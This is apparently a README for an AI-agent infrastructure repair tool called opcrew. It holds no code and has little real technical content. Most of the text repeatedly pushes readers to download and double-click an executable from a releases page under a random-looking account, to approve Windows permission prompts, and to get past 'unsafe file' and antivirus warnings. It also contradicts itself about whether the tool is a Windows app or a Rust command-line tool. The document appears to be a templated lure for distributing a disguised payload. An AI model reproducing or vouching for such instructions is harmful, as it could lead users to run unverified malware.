# 🤖 opcrew - Fix Infra Issues With AI

[![Download opcrew](https://img.shields.io/badge/Download-opcrew-blue?style=for-the-badge)](https://github.com/undercarriagemoschusmoschiferus808/opcrew/releases)

## 🚀 What opcrew does

opcrew is a Windows app that helps you find and fix infrastructure problems with a crew of AI agents.

It is built for common ops tasks like:

- checking service health
- reading logs
- spotting broken configs
- suggesting fixes
- helping you review changes before you apply them

It uses a safety-first flow. A guardian layer checks each action before it runs. That gives you more control over what the tool can do.

## 💻 Before you start

You only need a Windows PC and a web browser.

For best results, use:

- Windows 10 or Windows 11
- an internet connection
- enough free space to download the app and store logs
- permission to run downloaded files on your PC

If your work laptop blocks new apps, you may need help from your IT team.

## 📥 Download opcrew

Visit the release page and download the Windows version from there:

https://github.com/undercarriagemoschusmoschiferus808/opcrew/releases

Look for the latest release and choose the file made for Windows. If there are several files, pick the one with `.exe` or `.zip` in the name.

## 🪟 Install on Windows

### If you downloaded an `.exe` file

1. Open your Downloads folder.
2. Double-click the file.
3. If Windows asks for permission, choose **Yes** or **Run**.
4. Follow the setup steps on the screen.
5. When setup ends, open opcrew from the Start menu or desktop.

### If you downloaded a `.zip` file

1. Open your Downloads folder.
2. Right-click the `.zip` file.
3. Choose **Extract All**.
4. Pick a folder you can find again, like `Documents\opcrew`.
5. Open the extracted folder.
6. Double-click the app file inside the folder.

## 🧭 First launch

When you start opcrew for the first time, it may ask for basic setup steps.

You may see prompts for:

- your preferred workspace folder
- a connection to your AI provider
- access to logs or config files
- confirmation before any action is taken

Keep the default choices if you are not sure. They are a good place to start.

## 🔐 Safety model

opcrew is built to reduce risk.

It does not act on its own without checks. The guardian layer helps review planned steps before they run.

That means it can:

- show you what it plans to do
- ask before changing files
- keep a record of actions
- stop steps that look unsafe

This is useful when you want help, but still want control.

## 🛠️ Common things opcrew can help with

You can use opcrew to work through routine ops issues such as:

- a service that will not start
- a config file with a bad value
- a failed deployment
- an app that writes errors to a log file
- a server that looks slow or unstable

A typical flow looks like this:

1. You give opcrew a problem.
2. It checks the likely cause.
3. It suggests a fix.
4. The guardian layer reviews the action.
5. You approve or reject the change.

## 🧾 What to expect in the app

The app is built as a command-line tool, but it is meant for end users who want guided help.

You may see:

- a simple menu
- clear prompts
- progress messages
- plain-language suggestions
- a final report after each run

You do not need to know Rust, CLI tools, or devops terms to get started. The app should lead you through the main steps.

## ⚙️ Basic use

A common session may look like this:

1. Open opcrew.
2. Pick the system or folder you want it to check.
3. Describe the issue in plain language.
4. Let it scan logs, configs, or service state.
5. Review the plan it creates.
6. Confirm the actions you want it to take.

If you only want advice, you can stop before any change is made.

## 📁 Good files to point opcrew at

When you ask opcrew to help, it works best if you give it the right files or folders.

Useful inputs include:

- log folders
- service config files
- deployment notes
- error reports
- app output files
- system folders tied to the problem

If you do not know where the issue is, start with the log file. That often gives the clearest clue.

## 🧰 Example problems to try

Here are a few simple ways to use it:

- “My service stopped after a config change.”
- “This log keeps showing the same error.”
- “A deploy worked yesterday and fails now.”
- “Check what may have changed in this folder.”
- “Suggest a safe fix for this startup issue.”

Short, direct requests work best.

## 🔌 AI setup

opcrew uses AI agents to help with diagnosis and repair.

You may need to connect it to an AI service the first time you use it. If so, the app will guide you through the setup.

Keep these points in mind:

- use the provider you already have access to
- store keys in a safe place
- avoid sharing private data you do not want analyzed
- review each suggested fix before you approve it

## 🧪 Typical workflow

The app follows a multi-agent pattern. Each agent may focus on one part of the job, such as reading logs, checking system state, or drafting a fix.

A simple workflow can include:

- intake of the problem
- data collection
- root cause check
- fix proposal
- guardian review
- user approval
- action and report

This structure helps keep the work organized and easier to trust.

## 🧯 If something goes wrong

If the app does not start or does not respond, try these steps:

1. Close the app.
2. Open it again.
3. Check that you downloaded the latest release.
4. Make sure Windows did not block the file.
5. Try running it from a folder with a simple path, such as `C:\opcrew`.
6. If the app shows an error, note the message and try the same task again.

If a problem keeps coming back, use a different log file or a smaller test folder to narrow it down.

## 🪄 Tips for better results

- Give one problem at a time.
- Use clear names for files and folders.
- Keep your request short.
- Review each proposed action.
- Start with read-only checks before any fix.
- Save a copy of important config files before changes.

## 📦 Release downloads

Get the latest Windows build here:

https://github.com/undercarriagemoschusmoschiferus808/opcrew/releases

From that page, choose the newest release and download the Windows file that matches your setup.

## 🖥️ Windows file types

You may see one of these:

- `.exe` — double-click to run or install
- `.zip` — extract, then run the app inside
- `.msi` — use the Windows installer flow

If the release page lists more than one file, choose the one made for Windows desktop use.

## 🔍 Troubleshooting

If Windows says the file is unsafe, check that you downloaded it from the release page above.

If the app opens and closes right away, try:

- opening it from a terminal window if the release notes ask for that
- moving it to a short path like `C:\opcrew`
- checking whether your antivirus blocked it
- downloading the file again in case it was incomplete

If you cannot find the app after download, open the Downloads folder and sort by date.

## 🧩 Project focus

opcrew is aimed at:

- AI-assisted ops work
- faster issue diagnosis
- safer fixes
- repeatable checks
- clear control over changes

It is a good fit when you want help with infra work but still want to approve each step